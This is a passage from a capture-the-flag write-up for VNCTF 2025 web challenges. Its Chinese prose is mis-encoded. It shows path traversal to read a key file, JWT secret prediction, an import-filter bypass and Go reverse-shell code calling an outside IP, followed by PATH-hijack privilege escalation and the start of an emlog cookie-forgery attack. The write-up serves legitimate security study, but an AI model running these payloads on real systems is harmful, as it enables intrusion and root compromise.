class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯æ‰§è¡Œä¸€ä¸ªgoæ–‡ä»¶ï¼Œè¿™ä¸ªgoæ–‡ä»¶å°±æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„ï¼Œå†æœ‰ç”±adminç”¨æˆ·æ¥æ‰§è¡Œï¼</p><p>é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆéœ€è¦å…³æ³¨çš„æ˜¯jwtä¼ªé€ ã€‚è¦è·å–secret_keyå…ˆï¼Œåº”è¯¥æ˜¯ä¿å­˜åœ¨key.goï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦æ€ä¹ˆè·å¾—å‘¢ï¼Ÿï¼Ÿï¼Ÿ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Download</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">filename := c.DefaultQuery(<span class="string">&quot;filename&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> filename == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;Filename is required&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">basepath := <span class="string">&quot;./uploads&quot;</span></span><br><span class="line">filepath, _ := url.JoinPath(basepath, filename)</span><br><span class="line"><span class="keyword">if</span> _, err := os.Stat(filepath); os.IsNotExist(err) &#123;</span><br><span class="line">response.Response(c, http.StatusBadRequest, <span class="number">404</span>, <span class="literal">nil</span>, <span class="string">&quot;File not found&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">c.Header(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; filename=&quot;</span>+filename)</span><br><span class="line">c.File(filepath)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JoinPathä¸€çœ¼ç›®å½•ç©¿è¶Šï¼Œå¯ä»¥ä»»æ„ä¸‹è½½æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node.vnteam.cn:45733/download?filename=/../config/key.go</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ‹¿ä¸‹key.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Key</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;r00t32l&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Year</span><span class="params">()</span></span> <span class="type">int64</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2025</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å¾—ä¸€ä¸ªKeyå’Œä¸€ä¸ªYearçš„ã€‚</p><p>çœ‹çœ‹jwtå¯†é’¥ç”Ÿæˆé€»è¾‘</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenerateKey</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">rand.Seed(config.Year())</span><br><span class="line">randomNumber := rand.Intn(<span class="number">1000</span>)</span><br><span class="line">key := fmt.Sprintf(<span class="string">&quot;%03d%s&quot;</span>, randomNumber, config.Key())</span><br><span class="line"><span class="keyword">return</span> key</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬åœ°æ¨¡æ‹Ÿä¸€ä¸‹ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenerateKey</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">rand.Seed(<span class="number">2025</span>)</span><br><span class="line">randomNumber := rand.Intn(<span class="number">1000</span>)</span><br><span class="line">key := fmt.Sprintf(<span class="string">&quot;%03d%s&quot;</span>, randomNumber, <span class="string">&quot;r00t32l&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> key</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">key := GenerateKey()               <span class="comment">// è°ƒç”¨ GenerateKey å‡½æ•°</span></span><br><span class="line">fmt.Println(<span class="string">&quot;Generated Key:&quot;</span>, key) <span class="comment">// è¾“å‡ºç»“æœ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215183104538.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>æ‹¿ä¸‹secret_key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">122r00t32l</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215183500685.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>ç„¶åæˆ‘ä»¬è¦å…³æ³¨çš„æ˜¯RCEï¼Œæˆ‘ä»¬éœ€è¦è§£å†³wafçš„é—®é¢˜ï¼Œä¸å…è®¸å¯¼å…¥os&#x2F;exec</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">containsBannedPackages</span><span class="params">(code <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">importRegex := <span class="string">`(?i)import\s*\((?s:.*?)\)`</span></span><br><span class="line">re := regexp.MustCompile(importRegex)</span><br><span class="line">matches := re.FindStringSubmatch(code)</span><br><span class="line">imports := matches[<span class="number">0</span>]</span><br><span class="line">log.Println(imports)</span><br><span class="line"><span class="keyword">if</span> strings.Contains(imports, <span class="string">&quot;os/exec&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸¤ä¸ªçªç ´ç‚¹å•Šå–‚ï¼é¦–å…ˆè¿™ä¸ªregexpåªåŒ¹é…äº†matches[0]ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªåŒ¹é…åˆ°çš„importï¼Œé‚£ä¹ˆæˆ‘ä»¬åé¢å†å†™ä¸€ä¸ªimportå°±è¡Œå•¦ï¼ä¹Ÿå¯ä»¥é€šè¿‡å…¶ä»–åº“æ¥ä»£æ›¿ï¼</p><p>å…ˆæ¥è¯•è¯•ç¬¬ä¸€ç§å§ã€‚ã€‚ç›´æ¥å¼¹shellå¥½äº†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd:=exec.Command(<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1&quot;</span>)</span><br><span class="line">out,err:=cmd.CombinedOutput()</span><br><span class="line">fmt.Println(out)</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215184451698.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>æˆåŠŸæ‹¿åˆ°shellï¼ï¼ï¼</p><p>ä»¥ä¸‹æ–¹æ³•ä¹Ÿå¯ä»¥ï¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    syscall.Exec(<span class="string">&quot;/bin/sh&quot;</span>, []<span class="type">string</span>&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;whoami&quot;</span>&#125;, []<span class="type">string</span>&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd, _ := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;cmd:=exec.Command(\&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;exec bash -i &amp;&gt;/dev/tcp/ip/7777 &lt;&amp;1\&quot;);out,_:=cmd.CombinedOutput();fmt.Println(string(out))&quot;</span>,<span class="string">&quot;os/exec&quot;</span>, <span class="string">&quot;fmt&quot;</span>)</span><br><span class="line">fmt.Println(<span class="type">string</span>(cmd))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬cat &#x2F;flagçš„æ—¶å€™è¯»åˆ°äº†å‡çš„flagï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬è¦åšçš„åº”è¯¥å°±æ˜¯ææƒäº†ï¼Œå› ä¸ºflagåº”è¯¥åœ¨rootä¸‹</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215184700593.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215184804371.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å‘ç°äº†ä¸€ä¸ªå¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿&#x2F;â€¦&#x2F;Cat</p><p>å…¶ä»–éƒ½ç”¨ä¸å¤ªäº†ã€‚ã€‚</p><p>æˆ‘ä»¬çœ‹çœ‹é‚£æ˜¯ä»€ä¹ˆ</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215184848657.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>catä¸äº†ä¸€ç‚¹ï¼Œé‚£æŠŠä»–ä¸‹ä¸‹æ¥çœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">)</span><br><span class="line">import(</span><br><span class="line">&quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">cmd:=exec.Command(&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;cp /.../Cat Cat&quot;)</span><br><span class="line">out,err:=cmd.CombinedOutput()</span><br><span class="line">fmt.Println(out)</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠè¯¥æ–‡ä»¶æ”¾åˆ°ç½‘ç«™ç›®å½•ä¸‹</p><p>ç„¶åæˆ‘ä»¬é€šè¿‡downloadè·¯ç”±æŠŠä»–ä¸‹è½½ä¸‹æ¥ï¼ç”¨idaåˆ†æä¸€ä¸‹</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215185205197.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>è°ƒç”¨äº†system(â€œcat &#x2F;flagâ€);</p><p>å› ä¸ºè¯¥æ–‡ä»¶æœ‰suidæƒé™ï¼Œé‚£ä¹ˆå…¶å®å°±æ˜¯ä»¥rootæƒé™æ¥æ‰§è¡Œè¯¥å‘½ä»¤</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215185252625.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>è¿™é‡Œå½“ç„¶æ˜¯å‡çš„flag</p><p>æˆ‘ä»¬éœ€è¦çœ‹rootç›®å½•ä¸‹çš„flagæ–‡ä»¶ï¼Œæ­¤å¤„catå¹¶ä¸æ˜¯&#x2F;bin&#x2F;catï¼Œå¯ä»¥ç¯å¢ƒå˜é‡åŠ«æŒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash\n/bin/bash&#x27; &gt;/tmp/cat</span><br><span class="line">chmod 777 /tmp/cat</span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215190338915.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNCTF&#123;910a3c76-339b-e0db-73d4-bcfb411e6b7a&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œcatè¢«åŠ«æŒäº†ï¼Œä¸èƒ½ç”¨ï¼</p><h2 id="ez-emlog"><a href="#ez-emlog" class="headerlink" title="ez_emlog"></a>ez_emlog</h2><p>è€ƒå¯Ÿ0dayï¼Œæœ‰ç‚¹é€†å¤©äº†ã€‚æç¤ºmt_randï¼Œéšæœºæ•°ç”Ÿæˆé—®é¢˜ã€‚</p><p>ç›´æ¥å…¨å±€æœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span>, <span class="variable">$special_chars</span> = <span class="literal">true</span>, <span class="variable">$numeric_only</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$numeric_only</span>) &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$special_chars</span>) &#123;</span><br><span class="line">            <span class="variable">$chars</span> .= <span class="string">&#x27;!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$randStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$chars_length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randStr</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$chars</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="variable">$chars_length</span> - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randStr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾ä¸€ä¸‹ç”¨æ³•ï¼Œæ˜¯åœ¨install.phpä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$config</span> = <span class="string">&quot;&lt;?php\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;//MySQL database host\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_HOST = &#x27;<span class="subst">$db_host</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Database username\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_USER = &#x27;<span class="subst">$db_user</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Database user password\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_PASSWD = &#x27;<span class="subst">$db_pw</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Database name\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_NAME = &#x27;<span class="subst">$db_name</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Database Table Prefix\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const DB_PREFIX = &#x27;<span class="subst">$db_prefix</span>&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Auth key\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const AUTH_KEY = &#x27;&quot;</span> . <span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>) . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">getUA</span>()) . <span class="string">&quot;&#x27;;&quot;</span></span><br><span class="line">    . <span class="string">&quot;\n//Cookie name\n&quot;</span></span><br><span class="line">    . <span class="string">&quot;const AUTH_COOKIE_NAME = &#x27;EM_AUTHCOOKIE_&quot;</span> . <span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>, <span class="literal">false</span>) . <span class="string">&quot;&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>AUTH_KEYå’ŒAUTH_COOKIE_NAMEéƒ½ç”¨åˆ°äº†getRandStrï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹AUTH_KEYå’ŒAUTH_COOKIE_NAMEçš„ç”¨æ³•ã€‚</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216180900606.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>æˆ‘ä»¬å‘ç°AUTH_COOKIE_NAMEçš„å€¼æ˜¯å¯ä»¥è¢«æˆ‘ä»¬çŸ¥é“çš„ã€‚</p><p>åœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­åªæœ‰ç¬¬ä¸€æ¬¡è°ƒç”¨mt_rand()ä¼šè‡ªåŠ¨æ’­ç§ï¼Œæ¥ä¸‹æ¥éƒ½ä¼šæ ¹æ®è¿™ä¸ªç¬¬ä¸€æ¬¡æ’­ç§çš„ç§å­æ¥ç”Ÿæˆéšæœºæ•°<br>æ‰€ä»¥è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ AUTH_COOKIE_NAME çš„å€¼çˆ†ç ´ç§å­ï¼Œä»è€Œå¾—åˆ°AUTH_KEY</p><p>ä¹Ÿè¦çœ‹çœ‹AUTH_KEYçš„ç”¨æ³•ï¼Œå‘ç°ä»–åœ¨loginauth.phpä¸­è¢«ä½¿ç”¨ï¼Œå¯èƒ½æ˜¯ç™»å½•çš„èº«ä»½æ ¡éªŒéœ€è¦ç”¨åˆ°AUTH_KEYï¼Œå¦‚æœæˆ‘ä»¬è·å¾—äº†AUTH_KEYï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½é€šè¿‡ç™»å½•æ ¡éªŒã€‚å®ç°ç™»é™†çš„ä¼ªé€ ï¼</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216181116855.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateAuthCookie</span>(<span class="params"><span class="variable">$user_login</span>, <span class="variable">$expiration</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">       <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$user_login</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$hash</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">emHash</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$data</span>, AUTH_KEY);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAuthCookie</span>(<span class="params"><span class="variable">$cookie</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$cookie</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$cookie_elements</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$cookie</span>);</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$cookie_elements</span>) !== <span class="number">3</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$expiration</span>, <span class="variable">$hmac</span>) = <span class="variable">$cookie_elements</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$expiration</span>) &amp;&amp; <span class="variable">$expiration</span> &lt; <span class="title function_ invoke__">time</span>()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">       <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$hmac</span> !== <span class="variable">$hash</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$user</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserDataByLogin</span>(<span class="variable">$username</span>);</span><br><span class="line">       <span class="keyword">if</span> (!<span class="variable">$user</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°æ‰¾å‡ºäº†ä¸AUTH_KEYæœ‰å…³çš„ä»£ç ç‰‡æ®µ</p><p>ç”Ÿæˆè®¤è¯cookieä¸è¯å®è®¤è¯cookieï¼Œé‚£å°±çŸ³é”¤äº†ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯è§£å†³éšæœºæ•°é—®é¢˜ã€‚</p><p>å…ˆè·å–AUTH_COOKIE_NAME</p><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250216181655638.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 